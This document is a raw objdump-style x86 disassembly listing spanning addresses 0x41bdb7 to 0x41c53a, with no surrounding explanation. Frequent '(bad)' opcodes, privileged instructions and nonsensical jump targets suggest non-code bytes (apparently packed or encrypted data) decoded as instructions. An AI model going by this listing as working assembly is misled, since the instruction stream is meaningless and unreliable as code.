  41bdb7:	(bad)  
  41bdb8:	repnz mov bh,0x35
  41bdbb:	sub    BYTE PTR [esp+esi*1],bh
  41bdbe:	mov    ds:0xd12250e0,al
  41bdc3:	loop   0x41be1b
  41bdc5:	dec    ebx
  41bdc6:	je     0x41be06
  41bdc8:	add    BYTE PTR [ebx],al
  41bdca:	test   eax,0xd8d04a7d
  41bdcf:	pop    edx
  41bdd0:	std    
  41bdd1:	push   esp
  41bdd2:	in     al,0x75
  41bdd4:	or     al,0x7d
  41bdd6:	retf   0xe749
  41bdd9:	xchg   DWORD PTR ds:0xb1a66f74,ebx
  41bddf:	xlat   BYTE PTR ds:[ebx]
  41bde0:	pusha  
  41bde1:	imul   DWORD PTR [eax]
  41bde3:	push   es
  41bde4:	retf   
  41bde5:	inc    esp
  41bde6:	inc    edi
  41bde7:	loop   0x41be40
  41bde9:	mov    BYTE PTR [ebx+ebp*2+0x39e73a08],cl
  41bdf0:	shr    esi,1
  41bdf2:	leave  
  41bdf3:	cmp    BYTE PTR [edx+ebx*2+0xc96fc9f],bh
  41bdfa:	push   ebp
  41bdfb:	inc    esi
  41bdfc:	sub    BYTE PTR [edx+0x553dbe7b],al
  41be02:	daa    
  41be03:	push   0xc919aded
  41be08:	adc    al,0x25
  41be0a:	push   eax
  41be0b:	dec    ebp
  41be0c:	lds    ebp,FWORD PTR [edi-0x5b1f4941]
  41be12:	icebp  
  41be13:	shl    DWORD PTR [esi-0x4af72ddb],0x1
  41be1a:	pop    ss
  41be1b:	lock mov bh,0x22
  41be1e:	sub    edi,DWORD PTR [eax-0x49ea0535]
  41be24:	(bad)  
  41be25:	push   ebx
  41be26:	fisttp WORD PTR [ebp+0x1e36f031]
  41be2c:	jmp    0x41be8a
  41be2e:	retf   
  41be2f:	pop    ebp
  41be30:	adc    dh,BYTE PTR [edi]
  41be32:	jmp    0xf03c:0xaa93c026
  41be39:	xchg   ebp,eax
  41be3a:	and    ch,BYTE PTR [ecx-0x699a4401]
  41be40:	popf   
  41be41:	dec    eax
  41be42:	das    
  41be43:	push   eax
  41be44:	push   ebx
  41be45:	cmp    ecx,ebp
  41be47:	sbb    ecx,ebx
  41be49:	mov    cs,WORD PTR [eax+0x5e]
  41be4c:	inc    ebx
  41be4d:	into   
  41be4e:	mov    eax,ds:0x2af6045f
  41be53:	and    eax,0x3ce33be8
  41be58:	add    al,0x94
  41be5a:	lahf   
  41be5b:	lahf   
  41be5c:	sahf   
  41be5d:	and    eax,0x1e9344ff
  41be62:	jmp    0x41be90
  41be64:	mov    cl,0x96
  41be66:	call   0x9bd6:0xdc7d6516
  41be6d:	(bad)  
  41be6e:	fstp   QWORD PTR [edx]
  41be70:	sbb    BYTE PTR [edi-0x46a87389],dl
  41be76:	pusha  
  41be77:	push   eax
  41be78:	push   es
  41be79:	xchg   esi,eax
  41be7a:	rcr    DWORD PTR [ecx],1
  41be7c:	cdq    
  41be7d:	push   ebx
  41be7e:	pusha  
  41be7f:	push   es
  41be80:	xchg   edi,eax
  41be81:	push   0x364e4d8b
  41be86:	gs inc ebp
  41be88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be89:	icebp  
  41be8a:	and    ebx,ecx
  41be8c:	xlat   BYTE PTR ds:[ebx]
  41be8d:	addr16 jge 0x41be68
  41be90:	(bad)  
  41be91:	sub    cl,BYTE PTR fs:[ebx+0x1d270b0]
  41be98:	mov    esp,0xa6629afb
  41be9d:	mov    ebx,0xb0b83fd8
  41bea2:	or     eax,0x8d7cb13d
  41bea7:	std    
  41bea8:	jb     0x41bebe
  41beaa:	les    ecx,FWORD PTR [ebx]
  41beac:	scas   al,BYTE PTR es:[edi]
  41bead:	push   eax
  41beae:	ja     0x41bec6
  41beb0:	fwait
  41beb1:	mov    ch,0x1c
  41beb3:	sub    DWORD PTR [esi],ebx
  41beb5:	(bad)  
  41beb6:	jmp    0x61e16cb9
  41bebb:	cld    
  41bebc:	xchg   ebp,eax
  41bebd:	nop
  41bebe:	xchg   edi,eax
  41bebf:	aad    0x6d
  41bec1:	dec    esp
  41bec2:	call   0x70bd2e97
  41bec7:	les    edx,FWORD PTR [edx]
  41bec9:	out    0xd6,al
  41becb:	mov    ss,WORD PTR [edi]
  41becd:	test   BYTE PTR [edi-0x71],cl
  41bed0:	sti    
  41bed1:	call   0xba9bd8f9
  41bed6:	(bad)  
  41bed7:	fisttp DWORD PTR [esi-0x47]
  41beda:	stos   DWORD PTR es:[edi],eax
  41bedb:	(bad)  
  41bedc:	jns    0x41bf18
  41bede:	test   eax,0xf22f3e94
  41bee3:	pop    esp
  41bee4:	mov    ds:0x5c3f693,al
  41bee9:	(bad)  
  41beeb:	ret    
  41beec:	mov    DWORD PTR [ecx+0x119f1d2],ebp
  41bef2:	jmp    0x3e47167e
  41bef7:	adc    BYTE PTR [edi-0x1b],dh
  41befa:	outs   dx,DWORD PTR ds:[esi]
  41befc:	icebp  
  41befd:	imul   ecx,DWORD PTR [esp+ecx*8-0x1b],0x60
  41bf02:	xor    BYTE PTR [eax-0x1b3c20fe],al
  41bf08:	xor    ebx,DWORD PTR [eax+0x3fbb6a0d]
  41bf0e:	mov    al,ds:0xfcd76a04
  41bf13:	mov    ?,WORD PTR [edx+edi*8]
  41bf16:	cmp    edi,DWORD PTR [edx+eiz*1+0x3]
  41bf1a:	aas    
  41bf1b:	cmp    eax,0xdd9fb932
  41bf20:	mov    cl,0x85
  41bf22:	(bad)  
  41bf23:	fidiv  WORD PTR [eax+0xb]
  41bf26:	sti    
  41bf27:	cmp    eax,DWORD PTR [esi]
  41bf29:	mov    ch,BYTE PTR [ecx+0x4e]
  41bf2c:	cld    
  41bf2d:	dec    eax
  41bf2e:	and    BYTE PTR ds:0x8af9f16c,0x36
  41bf35:	jno    0x41bf83
  41bf37:	fsub   QWORD PTR [edi+0x9]
  41bf3a:	fmul   st(3),st
  41bf3c:	addr16 jle 0x41bef9
  41bf3f:	fild   WORD PTR [ebp+0x6c]
  41bf42:	test   al,0xf7
  41bf44:	rcr    edx,1
  41bf46:	imul   ebx,DWORD PTR [eax],0x75a19f5c
  41bf4c:	call   0x6d90:0x73931369
  41bf53:	mov    bl,0xc6
  41bf55:	pop    esi
  41bf56:	cmp    al,0x9
  41bf58:	mov    bl,0x1d
  41bf5a:	imul   esp,edx,0xde6731a0
  41bf60:	xchg   esi,eax
  41bf61:	cwde   
  41bf62:	nop
  41bf63:	ror    DWORD PTR [eax-0x40],1
  41bf66:	fisub  WORD PTR [edi-0x6a05a3c1]
  41bf6c:	call   0x4ebb:0xe082f10
  41bf73:	adc    bh,BYTE PTR [ebp+eiz*8-0x1a]
  41bf77:	mov    ch,bl
  41bf79:	inc    esi
  41bf7a:	push   ebp
  41bf7b:	not    DWORD PTR [edx]
  41bf7d:	(bad)  
  41bf7e:	fadd   QWORD PTR [ecx+0x45c5fd1]
  41bf84:	in     eax,0x75
  41bf86:	push   edi
  41bf87:	lods   al,BYTE PTR ds:[esi]
  41bf88:	daa    
  41bf89:	loopne 0x41bfff
  41bf8b:	mov    eax,ds:0xd65f5690
  41bf90:	loopne 0x41bf62
  41bf92:	shl    BYTE PTR [ecx+0x1b],1
  41bf95:	call   0x6e829114
  41bf9a:	jg     0x41c013
  41bf9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf9e:	in     al,0x37
  41bfa0:	jnp    0x41c021
  41bfa2:	push   ebx
  41bfa3:	xchg   esp,eax
  41bfa4:	push   ebp
  41bfa5:	(bad)  
  41bfa6:	test   bl,dl
  41bfa8:	aas    
  41bfa9:	stc    
  41bfaa:	gs ret 
  41bfac:	jecxz  0x41bfae
  41bfae:	pop    es
  41bfaf:	int3   
  41bfb0:	push   ebp
  41bfb1:	shl    DWORD PTR [esp+edi*8+0x2],cl
  41bfb5:	popf   
  41bfb6:	imul   ecx,ebp,0xffffffbe
  41bfb9:	or     al,0x34
  41bfbb:	or     dh,dh
  41bfbd:	xchg   esp,eax
  41bfbe:	or     eax,DWORD PTR [ecx+0x26]
  41bfc1:	cmp    al,0x11
  41bfc3:	mov    ecx,ecx
  41bfc5:	retf   
  41bfc6:	xchg   edx,eax
  41bfc7:	add    edx,DWORD PTR [edx-0x2043cd98]
  41bfcd:	mov    esp,0x58c7d815
  41bfd2:	pop    es
  41bfd3:	sbb    cl,BYTE PTR [ebx-0x4d]
  41bfd6:	into   
  41bfd7:	push   0xffffffde
  41bfd9:	dec    edx
  41bfda:	pop    esp
  41bfdb:	cmc    
  41bfdc:	popa   
  41bfdd:	adc    esp,DWORD PTR [eax-0x74]
  41bfe0:	mov    esp,gs
  41bfe2:	pop    edx
  41bfe3:	cwde   
  41bfe4:	pop    esp
  41bfe5:	and    BYTE PTR [ecx*8-0x449ca13c],ch
  41bfec:	or     eax,0x4b89525b
  41bff1:	add    al,0x26
  41bff3:	ss mov al,0x4d
  41bff6:	add    ah,BYTE PTR [eax+0x155d9309]
  41bffc:	ins    BYTE PTR es:[edi],dx
  41bffd:	bound  eax,QWORD PTR [esi+0x45238f87]
  41c003:	mov    DWORD PTR [ebp+0x77731f4d],edi
  41c009:	in     al,dx
  41c00a:	pop    ecx
  41c00b:	jo     0x41c00b
  41c00d:	xchg   edx,eax
  41c00e:	pop    ss
  41c00f:	sbb    DWORD PTR [edx+0x1a1663a3],edi
  41c015:	add    al,BYTE PTR [ebx-0x4b]
  41c018:	(bad)  
  41c019:	xor    cl,BYTE PTR [esi+0x260f3d14]
  41c01f:	ds out 0xb0,eax
  41c022:	mov    bl,0x87
  41c024:	fldenv [edx-0x17]
  41c027:	add    dl,al
  41c029:	std    
  41c02a:	jno    0x41bfcc
  41c02c:	mov    dl,0x36
  41c02e:	mov    DWORD PTR [edx+0x6d430b2a],0xa1186523
  41c038:	jns    0x41c08f
  41c03a:	stos   DWORD PTR es:[edi],eax
  41c03b:	mov    ebp,0xed9887a6
  41c040:	fwait
  41c041:	add    BYTE PTR [edx+0x558244de],0xb7
  41c048:	(bad)  
  41c049:	pop    ebp
  41c04a:	int    0x50
  41c04c:	(bad)  
  41c04d:	les    ebp,FWORD PTR ss:[esp+edx*4+0x32d127f9]
  41c055:	add    BYTE PTR [eax+0x26],bh
  41c058:	jno    0x41c079
  41c05a:	pop    es
  41c05b:	je     0x41c040
  41c05d:	retf   0x6c30
  41c060:	cdq    
  41c061:	pop    edx
  41c062:	or     eax,0x9761a41
  41c067:	out    0xa3,al
  41c069:	jecxz  0x41c01c
  41c06b:	aaa    
  41c06c:	lahf   
  41c06d:	mov    edi,DWORD PTR [eax-0x62]
  41c070:	pushf  
  41c071:	xor    al,0xc7
  41c073:	or     eax,0xe6eee7e4
  41c078:	icebp  
  41c079:	repnz mov esi,0xe3e97525
  41c07f:	cs and eax,0x2f7800c2
  41c085:	adc    BYTE PTR [esi+0x47],bh
  41c088:	fcom   QWORD PTR [eax+0x4c]
  41c08b:	mov    esi,0x65420788
  41c090:	jbe    0x41c103
  41c092:	(bad)  
  41c093:	mov    ah,BYTE PTR [edi-0x2f]
  41c096:	retf   
  41c097:	outs   dx,DWORD PTR ds:[esi]
  41c098:	fsubp  st(3),st
  41c09a:	ins    BYTE PTR es:[edi],dx
  41c09b:	jno    0x41c08e
  41c09d:	(bad)  
  41c09e:	je     0x41c116
  41c0a0:	mov    edx,0xa064b177
  41c0a5:	fwait
  41c0a6:	les    ebp,FWORD PTR [esi+0x2e]
  41c0a9:	aas    
  41c0aa:	jl     0x41c112
  41c0ac:	adc    eax,0x7661a02c
  41c0b1:	das    
  41c0b2:	fnstsw WORD PTR [ecx]
  41c0b4:	sbb    dh,ch
  41c0b6:	imul   eax,DWORD PTR [edi-0x18],0x1548d1b0
  41c0bd:	gs cmp al,0x9f
  41c0c0:	scas   eax,DWORD PTR es:[edi]
  41c0c1:	aaa    
  41c0c2:	test   eax,0x469fa588
  41c0c7:	ret    
  41c0c8:	fadd   st(0),st
  41c0ca:	adc    eax,0xd733fc0f
  41c0cf:	outs   dx,BYTE PTR ds:[esi]
  41c0d0:	jl     0x41c107
  41c0d2:	cmp    esp,DWORD PTR [edx+0xb]
  41c0d5:	ret    
  41c0d6:	push   0x5d
  41c0d8:	push   cs
  41c0d9:	mul    BYTE PTR [ebx-0x54]
  41c0dc:	(bad)  
  41c0dd:	sbb    eax,0xadff5b69
  41c0e2:	rol    BYTE PTR [ecx-0x13],1
  41c0e5:	fisub  DWORD PTR [esi]
  41c0e7:	add    bl,BYTE PTR [eax-0xdb7447c]
  41c0ed:	xchg   ecx,eax
  41c0ee:	add    DWORD PTR [esi+eiz*2+0x37],edi
  41c0f2:	mov    edi,0x423c4b14
  41c0f7:	inc    ebx
  41c0f8:	test   al,0xff
  41c0fa:	pop    ds
  41c0fb:	jmp    0xdd5d54c
  41c100:	jns    0x41c0af
  41c102:	out    0xf4,eax
  41c104:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c105:	adc    al,0x25
  41c107:	sar    DWORD PTR [edx+0x23],0xd4
  41c10b:	jg     0x41c14e
  41c10d:	xchg   ebp,eax
  41c10e:	dec    edi
  41c10f:	popa   
  41c110:	push   0x8767ede8
  41c115:	outs   dx,BYTE PTR ds:[esi]
  41c116:	aam    0x2a
  41c118:	stc    
  41c119:	in     al,0xaa
  41c11b:	imul   eax,DWORD PTR [edi+0x33],0xffffffa7
  41c11f:	xchg   DWORD PTR [esi-0x7fc2e729],ebx
  41c125:	push   ss
  41c126:	fst    DWORD PTR [eax+0x5232f418]
  41c12c:	add    ecx,DWORD PTR ds:0x952155bb
  41c132:	ror    BYTE PTR ds:0x41c22400,1
  41c138:	aas    
  41c139:	pop    esp
  41c13a:	mov    ecx,0x97389a9
  41c13f:	mov    dl,0x9a
  41c141:	ret    0x932e
  41c144:	fst    QWORD PTR [edi]
  41c146:	shr    DWORD PTR [ebp-0x2ba0fb36],cl
  41c14c:	call   DWORD PTR [edi+0x24]
  41c14f:	test   BYTE PTR [eax-0x43],ah
  41c152:	mov    ah,0x47
  41c154:	into   
  41c155:	not    DWORD PTR [edx]
  41c157:	push   eax
  41c158:	retf   0x2b79
  41c15b:	pop    ds
  41c15c:	dec    ebx
  41c15d:	xchg   ebx,eax
  41c15e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c15f:	fnstenv [ebp-0x4d]
  41c162:	cmp    al,0xf6
  41c164:	mov    bh,0xc4
  41c166:	add    cl,BYTE PTR [eax+0x76]
  41c169:	pusha  
  41c16a:	arpl   WORD PTR [edx-0x2b27ca14],bx
  41c170:	add    edx,ebx
  41c172:	xchg   ebx,eax
  41c173:	mov    ebx,ds
  41c175:	mov    ecx,0xa07ecc00
  41c17a:	test   BYTE PTR [ebx+edi*1],bh
  41c17d:	lock add al,0xe5
  41c180:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c181:	stos   BYTE PTR es:[edi],al
  41c182:	pop    ebx
  41c183:	repz je 0x41c11f
  41c186:	sbb    al,0x1
  41c188:	xor    edi,DWORD PTR [ecx+0x7d8c4d47]
  41c18e:	inc    edi
  41c18f:	das    
  41c190:	xchg   esi,eax
  41c191:	sub    bl,ch
  41c193:	retf   0xd68e
  41c196:	xor    esi,DWORD PTR [esi+eax*4+0x1f]
  41c19a:	(bad)  
  41c19b:	pop    edi
  41c19c:	shl    DWORD PTR [eax-0x21],0xeb
  41c1a0:	xor    DWORD PTR [ebx+0x3a],edx
  41c1a3:	sub    al,0xd7
  41c1a5:	arpl   WORD PTR [esi],si
  41c1a7:	inc    eax
  41c1a8:	repnz inc esp
  41c1aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1ab:	jmp    0x89190b37
  41c1b0:	test   edx,eax
  41c1b2:	call   0x6f6a:0xa1b8f312
  41c1b9:	int3   
  41c1ba:	sub    edi,ebx
  41c1bc:	sub    al,BYTE PTR [eax+eiz*2]
  41c1bf:	push   es
  41c1c0:	add    eax,0xdf90dd9a
  41c1c5:	cs mov ch,0xf7
  41c1c8:	mov    ebx,0x325f4b55
  41c1cd:	sahf   
  41c1ce:	mov    ds:0x9c23cf1d,eax
  41c1d3:	inc    esp
  41c1d4:	adc    BYTE PTR [eax],cl
  41c1d6:	mov    ebp,0x51e88112
  41c1db:	pop    ebx
  41c1dc:	xchg   DWORD PTR [ebp-0x5e0c84bb],edx
  41c1e2:	ins    DWORD PTR es:[edi],dx
  41c1e3:	jns    0x41c1fe
  41c1e5:	cdq    
  41c1e6:	daa    
  41c1e7:	and    al,0xa5
  41c1e9:	fnsave [ebp-0x7b]
  41c1ec:	xor    BYTE PTR [ebx+0x5b],al
  41c1ef:	sbb    BYTE PTR [eax-0x48167048],cl
  41c1f5:	loop   0x41c1e0
  41c1f7:	mov    ds:0xde2d2e4c,al
  41c1fc:	jae    0x41c226
  41c1fe:	or     DWORD PTR ds:0x66b0b2d9,ecx
  41c204:	std    
  41c205:	mov    cl,0x17
  41c207:	vmwrite eax,esp
  41c20a:	fidivr DWORD PTR fs:[esi]
  41c20d:	adc    ebx,ecx
  41c20f:	sbb    eax,0xdf4a7a6f
  41c214:	popa   
  41c215:	repnz call 0xe7c3:0x7d7aa944
  41c21d:	stos   DWORD PTR es:[edi],eax
  41c21e:	jg     0x41c29e
  41c220:	lods   al,BYTE PTR ds:[esi]
  41c221:	cmp    eax,DWORD PTR [ebx+edi*1]
  41c224:	mov    edi,eax
  41c226:	stc    
  41c227:	shl    DWORD PTR [ebp-0x517c4bb6],cl
  41c22d:	(bad)  
  41c22e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c22f:	lock mov dh,BYTE PTR [ebx+0x6ff938a2]
  41c236:	jne    0x41c20b
  41c238:	add    ebx,edi
  41c23a:	sub    eax,0x6279f46c
  41c23f:	cdq    
  41c240:	push   ss
  41c241:	or     dl,cl
  41c243:	or     DWORD PTR [edi],esi
  41c245:	pushf  
  41c246:	and    BYTE PTR [ecx-0x21],0x78
  41c24a:	das    
  41c24b:	mov    DWORD PTR [edi+0x5a],0x9a9ba5cf
  41c252:	icebp  
  41c253:	lahf   
  41c254:	adc    bh,BYTE PTR [edx-0x49]
  41c257:	jl     0x41c235
  41c259:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c25a:	sbb    BYTE PTR [ecx+0x17],al
  41c25d:	das    
  41c25e:	pop    eax
  41c25f:	pop    es
  41c260:	stc    
  41c261:	sub    DWORD PTR [eax],ebp
  41c263:	inc    esp
  41c264:	jno    0x41c22b
  41c266:	fnstcw WORD PTR [edi+0x8]
  41c269:	jae    0x41c239
  41c26b:	jne    0x41c2ea
  41c26d:	and    BYTE PTR [ecx],cl
  41c26f:	jg     0x41c236
  41c271:	test   ah,bl
  41c273:	xchg   ebx,eax
  41c274:	mov    ch,0x4a
  41c276:	mov    edx,0xb11ed461
  41c27b:	sub    BYTE PTR gs:[ecx-0x5f],bh
  41c27f:	js     0xa340c691
  41c285:	int    0x1d
  41c287:	retf   0xbe66
  41c28a:	pop    ebx
  41c28b:	xor    bl,BYTE PTR [esi+0x55]
  41c28e:	gs or  dh,0xb5
  41c292:	sub    BYTE PTR [esi-0x54],cl
  41c295:	xor    edi,DWORD PTR [ebp+0x42c511a9]
  41c29b:	push   eax
  41c29c:	aad    0x13
  41c29e:	cs cmp al,0xa4
  41c2a1:	aam    0xd2
  41c2a3:	dec    ebp
  41c2a4:	out    dx,eax
  41c2a5:	push   esp
  41c2a6:	mov    ah,0xd
  41c2a8:	add    DWORD PTR [edi+0x5573eb93],edx
  41c2ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2af:	xchg   ebp,eax
  41c2b0:	adc    DWORD PTR [esi+0x3bb6bf62],0xffffffad
  41c2b7:	sahf   
  41c2b8:	mov    edx,0x55837731
  41c2bd:	sub    bl,dl
  41c2bf:	push   eax
  41c2c0:	sub    eax,0x359ceb81
  41c2c5:	js     0x41c340
  41c2c7:	adc    esi,DWORD PTR [edx+0x16]
  41c2ca:	dec    eax
  41c2cb:	mov    eax,0xfe960d76
  41c2d0:	mov    eax,ds:0x57146d62
  41c2d5:	stos   BYTE PTR es:[edi],al
  41c2d6:	loopne 0x41c335
  41c2d8:	imul   ecx,DWORD PTR [eax],0x8b8e1170
  41c2de:	in     al,dx
  41c2df:	retf   0x907e
  41c2e2:	jne    0x41c32a
  41c2e4:	jae    0x41c343
  41c2e6:	addr16 push ss
  41c2e8:	ss stos DWORD PTR es:[edi],eax
  41c2ea:	leave  
  41c2eb:	iret   
  41c2ec:	stc    
  41c2ed:	mov    eax,ds:0x712a5f9c
  41c2f2:	fnsave [edx+0x19d1bacb]
  41c2f8:	push   ds
  41c2f9:	sti    
  41c2fa:	sub    BYTE PTR [ebx+ebp*4-0x7fccd31],ch
  41c301:	push   eax
  41c302:	in     eax,dx
  41c303:	hlt    
  41c304:	ja     0x41c2fb
  41c306:	xor    bl,BYTE PTR [ecx+0x36]
  41c309:	pop    edi
  41c30a:	jae    0x41c327
  41c30c:	scas   al,BYTE PTR es:[edi]
  41c30d:	pop    eax
  41c30e:	sahf   
  41c30f:	mov    WORD PTR [edx+0x79],fs
  41c312:	mov    dh,0x1a
  41c314:	(bad)  
  41c315:	xor    edi,DWORD PTR [ecx+0x44767bd7]
  41c31b:	push   es
  41c31c:	int    0x70
  41c31e:	mov    fs,WORD PTR [esi+ebx*8+0x24]
  41c322:	sub    esi,esp
  41c324:	sbb    eax,0x6b35738
  41c329:	mov    ecx,0x77f591b0
  41c32e:	and    ecx,esi
  41c330:	lods   al,BYTE PTR es:[esi]
  41c332:	lock (bad) 
  41c334:	lea    edx,[edi]
  41c336:	adc    eax,0xf23f03f
  41c33b:	in     al,dx
  41c33c:	pop    ds
  41c33d:	inc    esi
  41c33e:	icebp  
  41c33f:	xchg   edx,eax
  41c340:	sar    edx,cl
  41c342:	cld    
  41c343:	repnz xor bl,BYTE PTR [ecx-0x4a]
  41c347:	aam    0x98
  41c349:	ret    
  41c34a:	scas   al,BYTE PTR es:[edi]
  41c34b:	jmp    0xac09b05f
  41c350:	mov    ds:0x9e073fc8,al
  41c355:	in     al,dx
  41c356:	out    dx,eax
  41c357:	nop
  41c358:	(bad)  
  41c359:	cdq    
  41c35a:	fwait
  41c35b:	sbb    esi,DWORD PTR [edx+ecx*8+0x38]
  41c35f:	pop    ebx
  41c360:	mov    BYTE PTR [eax+0xe],al
  41c363:	cmp    BYTE PTR [esi-0x52],bl
  41c366:	jo     0x41c311
  41c368:	out    0x8,eax
  41c36a:	xchg   ebx,eax
  41c36b:	pop    esi
  41c36c:	or     eax,0xf41faf6
  41c371:	fstp   QWORD PTR [esi]
  41c373:	test   ch,bl
  41c375:	test   BYTE PTR [edx-0x18],ah
  41c378:	mov    ebp,fs
  41c37a:	ss pop edx
  41c37c:	cli    
  41c37d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c37e:	adc    edx,DWORD PTR [ebx]
  41c380:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c381:	lods   eax,DWORD PTR ds:[esi]
  41c382:	leave  
  41c383:	xor    eax,0xffffff81
  41c386:	ss lahf 
  41c388:	push   eax
  41c389:	push   es
  41c38a:	dec    eax
  41c38b:	sub    al,0xfe
  41c38d:	push   0xffffffea
  41c38f:	mov    esp,0x650b7ac4
  41c394:	je     0x41c3fe
  41c396:	add    ah,BYTE PTR [ebx-0x68b34a3f]
  41c39c:	xchg   DWORD PTR [ecx],ecx
  41c39e:	jmp    0x41c328
  41c3a0:	jo     0x41c40b
  41c3a2:	(bad)  
  41c3a3:	imul   edx,ebp,0x1225cd5b
  41c3a9:	dec    esi
  41c3aa:	pop    ds
  41c3ab:	cmp    eax,0x5f916e9
  41c3b0:	imul   edx,DWORD PTR [ecx],0xffffffb8
  41c3b3:	jmp    0xce4d:0x7a1170a7
  41c3ba:	enter  0x2ad8,0x5a
  41c3be:	ss jmp 0x2b82:0x258432ab
  41c3c6:	adc    bl,BYTE PTR [ecx-0x6b]
  41c3c9:	mov    esi,0x70d64478
  41c3ce:	or     edx,edx
  41c3d0:	pop    edi
  41c3d1:	je     0x41c383
  41c3d3:	dec    ebx
  41c3d4:	inc    edi
  41c3d5:	xchg   esi,eax
  41c3d6:	shr    DWORD PTR [ecx-0x6c],cl
  41c3d9:	stos   BYTE PTR es:[edi],al
  41c3da:	xchg   edi,eax
  41c3db:	adc    eax,0x99adef7b
  41c3e0:	ds xor al,0x44
  41c3e3:	sbb    eax,0xd6a1d930
  41c3e8:	aam    0xdb
  41c3ea:	mov    esi,0x707e3e56
  41c3ef:	or     ch,BYTE PTR [edi]
  41c3f1:	and    al,0x5a
  41c3f3:	stc    
  41c3f4:	fnsave [ecx]
  41c3f6:	(bad)  
  41c3f7:	jmp    0x55db240f
  41c3fc:	aam    0xba
  41c3fe:	clc    
  41c3ff:	imul   esi,DWORD PTR [esi],0xffffff91
  41c402:	arpl   WORD PTR ss:[edx-0x1990664d],di
  41c409:	bound  ebx,QWORD PTR [eax+0x3e]
  41c40c:	lods   al,BYTE PTR ds:[esi]
  41c40d:	push   eax
  41c40e:	fisttp DWORD PTR [edi]
  41c410:	(bad)  
  41c411:	lock sbb BYTE PTR [ecx+eiz*1+0x4a3007ee],bh
  41c419:	clc    
  41c41a:	pop    ebx
  41c41b:	mov    edx,0xde83316e
  41c420:	das    
  41c421:	or     BYTE PTR [esi],bl
  41c423:	js     0x41c48d
  41c425:	enter  0xc745,0x6
  41c429:	cmova  esp,edx
  41c42c:	dec    edx
  41c42d:	push   ds
  41c42e:	loope  0x41c4ae
  41c430:	push   cs
  41c431:	ret    
  41c432:	xchg   BYTE PTR [edx+0x5a],dl
  41c435:	ret    
  41c436:	or     ah,BYTE PTR ds:0x83c68187
  41c43c:	xchg   BYTE PTR [ebp+0x268ca96e],al
  41c442:	fdivr  QWORD PTR [eax-0x585420e6]
  41c448:	fxtract 
  41c44a:	loope  0x41c4c8
  41c44c:	into   
  41c44d:	xor    al,0x14
  41c44f:	cmc    
  41c450:	pop    ss
  41c451:	add    ebx,DWORD PTR [esi+0x2c]
  41c454:	jo     0x41c456
  41c456:	mov    DWORD PTR [eax-0x19],edi
  41c459:	jbe    0x41c443
  41c45b:	xchg   DWORD PTR [edi],ebp
  41c45d:	dec    ebp
  41c45e:	rol    BYTE PTR [edi+0x44],1
  41c461:	inc    esp
  41c462:	test   dh,ah
  41c464:	or     al,0x76
  41c466:	pushf  
  41c467:	aad    0xe2
  41c469:	sub    al,dh
  41c46b:	in     al,0x35
  41c46d:	mov    dh,0x80
  41c46f:	or     al,0x40
  41c471:	iret   
  41c472:	bound  eax,QWORD PTR [ecx+0x96a8712]
  41c478:	cmp    BYTE PTR [ebp+0x7d5a92ce],dh
  41c47e:	add    al,0x97
  41c480:	imul   esp,DWORD PTR [ecx+0x6e],0xfffffff2
  41c484:	mov    ds:0x1c7a442b,al
  41c489:	loop   0x41c461
  41c48b:	lds    eax,FWORD PTR ds:0xc98408e8
  41c491:	or     ah,0x43
  41c494:	loope  0x41c472
  41c496:	mov    edx,0x7bd6a311
  41c49b:	es (bad) 
  41c49d:	xchg   ebp,eax
  41c49e:	pop    ss
  41c49f:	push   esi
  41c4a0:	hlt    
  41c4a1:	(bad)  
  41c4a2:	pop    eax
  41c4a3:	cmp    eax,0x289931fc
  41c4a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4a9:	test   eax,0x2e778cf1
  41c4ae:	or     DWORD PTR [esi+eax*2],eax
  41c4b1:	pusha  
  41c4b2:	call   0x5fc5:0xc1ffd536
  41c4b9:	mov    bl,0x82
  41c4bb:	rcl    DWORD PTR [ebx+edx*1-0x1695bd4c],0x4c
  41c4c3:	out    0xb0,al
  41c4c5:	(bad)  
  41c4c6:	dec    ecx
  41c4c7:	cmp    al,0x56
  41c4c9:	jmp    0x678ecb6e
  41c4ce:	aas    
  41c4cf:	fcmovbe st,st(6)
  41c4d1:	cmp    DWORD PTR [ebx],eax
  41c4d3:	lods   al,BYTE PTR ds:[esi]
  41c4d4:	dec    ecx
  41c4d5:	out    0x20,eax
  41c4d7:	cmp    edx,DWORD PTR [esi+0x44413c55]
  41c4dd:	mov    ch,0xa5
  41c4df:	jbe    0x41c496
  41c4e1:	popa   
  41c4e2:	inc    ebp
  41c4e3:	adc    al,0xc6
  41c4e5:	lods   eax,DWORD PTR ds:[esi]
  41c4e6:	mov    esi,0xc247a6fb
  41c4eb:	sahf   
  41c4ec:	cld    
  41c4ed:	xchg   BYTE PTR [ecx],bh
  41c4ef:	dec    eax
  41c4f0:	mov    dh,0xaa
  41c4f2:	dec    esp
  41c4f3:	enter  0x6389,0x23
  41c4f7:	or     DWORD PTR [edx-0x331dcc26],0x1f
  41c4fe:	mov    ebx,0xfed8ceed
  41c503:	mov    esi,0xdbf4fbc
  41c508:	mov    BYTE PTR [ebp+0x65],ah
  41c50b:	or     edx,DWORD PTR [edx+ebp*8+0x1e]
  41c50f:	and    al,bl
  41c511:	lds    edx,FWORD PTR [eax+0x19d0858c]
  41c517:	adc    DWORD PTR [esi+0x23755534],esi
  41c51d:	xchg   edi,eax
  41c51e:	rcl    BYTE PTR [esi-0x5c],cl
  41c521:	jnp    0x41c56f
  41c523:	adc    BYTE PTR [ebx+edx*8],dl
  41c526:	retf   0xf8d
  41c529:	adc    BYTE PTR [ebx+0x39],ch
  41c52c:	push   esi
  41c52d:	aam    0xf
  41c52f:	mov    esi,0x2671c6f9
  41c534:	or     BYTE PTR [ecx-0x54],cl
  41c537:	xlat   BYTE PTR ds:[ebx]
  41c538:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c539:	xchg   esi,eax
  41c53a:	jnp    0x41c546
